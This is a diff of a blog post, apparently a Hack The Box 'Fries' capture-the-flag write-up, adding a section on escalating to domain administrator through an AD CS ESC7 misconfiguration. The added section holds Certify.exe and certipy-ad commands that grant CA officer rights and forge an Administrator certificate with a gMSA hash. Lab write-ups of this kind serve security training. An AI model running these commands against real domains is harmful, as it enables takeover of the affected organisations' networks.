@@ -1,10 +1,12 @@
 ---
 title: 'HTB-Fries'
 published: 2025-11-25
-draft: true
+draft: false
 toc: true
-tags: ["ffuf", "vhosts", "docker", "docker-escape", "PostgreSQL", "nfs", "PWM", "BloodHound", "ReadGMSAPassword", "ESC7"]
+tags: ["ffuf", "vhosts", "docker", "docker-escape", "PostgreSQL", "nfs", "PWM", "BloodHound", "ReadGMSAPassword", "ESC7", "certipy-ad"]
 ---
+
+import PasswordProtect from "~/components/PasswordProtect.client";
 
 ```
 Scope:
@@ -84,6 +86,8 @@ Host script results:
 |   3:1:1: 
 |_    Message signing enabled and required
 ```
+
+<PasswordProtect client:load>
 
 ## 443/TCP - HTTPS
 
@@ -529,18 +533,119 @@ certipy-ad ca \
 
 ![](attachments/8e917acb5f5b0818799a986aa5b9c620.png)
 
-We will now have to update the templates by adding the `SubCA` template: 
+:::note 
+However this is where I ended up in some trouble, for whatever reason `certipy-ad` didn't give me the full picture. 
+Instead I used `evil-winrm-py` to login with the kerberos ticket.
+:::
 
-```bash
-certipy-ad template \                                                                                              
-  -template SubCA \
-  -save-configuration subca.json \
-  -dc-ip 10.10.11.96 \
-  -dc-host DC01.fries.htb \
-  -target DC01.fries.htb \
-  -k
+![alt text](<Pasted image 20251125084217.png>)
+
+After logging in I transferred over `certify.exe` and reran my enumeration steps.
+
+![alt text](<Pasted image 20251125084309.png>)
+
+I then used the tool to enumerate everything:
+
+```powershell
+.\Certify.exe enum-cas --filter-vulnerable --hide-admins
 ```
 
-![](attachments/cb6b659413494455d9d9d394e1116585.png)
+![alt text](<Pasted image 20251125091003.png>)
+
+I starting looking through the output.
+
+![alt text](<Pasted image 20251125091116.png>)
+
+And down at the bottom we notice the enabled certificates:
+
+![alt text](<Pasted image 20251125091333.png>)
+
+I issued the following command:
+
+```powershell
+./Certify.exe manage-ca --officer S-1-5-21-858338346-3861030516-3975240472-1104 --ca FRIES.HTB\fries-DC01-CA
+```
+
+![alt text](<Pasted image 20251125103808.png>)
+
+And followed it up with adding the group which had the `Deny` set on `ManageCertificates` so I could overwrite it:
+
+```powershell
+.\Certify.exe manage-ca --ca FRIES.HTB\fries-DC01-CA --officer 'S-1-5-21-858338346-3861030516-3975240472-515'
+```
+
+![alt text](<Pasted image 20251125104021.png>)
+
+#### Request Issue - FAIL
+
+Now I could issue a request:
+
+```bash
+certipy-ad req -u 'gmsa_ca_prod$' -hashes fc20b3d3ec179c5339ca59fbefc18f4a -dc-ip 10.10.11.96 -dc-host dc01.fries.htb -target dc01.fries.htb -ca fries-DC01-CA -template subca -upn 'administrator@fries.htb'
+```
+
+![alt text](<Pasted image 20251125120450.png>)
+
+This fails but we still need save the private key. Next up:
+
+```bash
+certipy-ad -debug ca -ca fries-DC01-CA -dc-ip 10.10.11.96 -u 'gMSA_CA_prod$@fries.htb' -hashes :fc20b3d3ec179c5339ca59fbefc18f4a -k -target dc01.fries.htb -issue-request 42
+```
+
+![alt text](<Pasted image 20251125120542.png>)
+
+And lastly we retrieve it:
+
+```bash
+certipy-ad req -u 'gMSA_CA_prod$@fries.htb' -hashes :fc20b3d3ec179c5339ca59fbefc18f4a -k -dc-ip 10.10.11.96 -dc-host dc01.fries.htb -target dc01.fries.htb -ca fries-DC01-CA -retrieve 42
+```
+
+![alt text](<Pasted image 20251125120651.png>)
+
+Unfortunately though this is where we hit a roadblock:
+
+![alt text](<Pasted image 20251125120830.png>)
+
+#### Request Issue - SUCCESS
+
+It appears we'll need to request the certificate including the *Administrator* SID:
+
+![alt text](<Pasted image 20251125121134.png>)
+
+This basically meant I had to redo the requests again, but this time around involving the SID:
+
+```bash
+certipy-ad req -u 'gmsa_ca_prod$' -hashes fc20b3d3ec179c5339ca59fbefc18f4a -dc-ip 10.10.11.96 -dc-host dc01.fries.htb -target dc01.fries.htb -ca fries-DC01-CA -template subca -upn 'administrator@fries.htb' -sid "S-1-5-21-858338346-3861030516-3975240472-500"
+```
+
+![alt text](<Pasted image 20251125121411.png>)
+
+```bash
+certipy-ad -debug ca -ca fries-DC01-CA -dc-ip 10.10.11.96 -u 'gMSA_CA_prod$@fries.htb' -hashes :fc20b3d3ec179c5339ca59fbefc18f4a -k -target dc01.fries.htb -issue-request 43
+```
+
+![alt text](<Pasted image 20251125121508.png>)
+
+```bash
+certipy-ad -debug req -u 'gMSA_CA_prod$@fries.htb' -hashes :fc20b3d3ec179c5339ca59fbefc18f4a -k -dc-ip 10.10.11.96 -dc-host dc01.fries.htb -target dc01.fries.htb -ca fries-DC01-CA -retrieve 43
+```
+
+![alt text](<Pasted image 20251125121533.png>)
+
+This time around it worked!
+
+![alt text](<Pasted image 20251125121556.png>)
+
+I could now easily get access with the saved kerberos ticket:
+
+![alt text](<Pasted image 20251125121643.png>)
+
+#### root.txt
+
+![alt text](<Pasted image 20251125121735.png>)
+
+![alt text](<Pasted image 20251125121801.png>)
+
+</PasswordProtect>
 
 ---
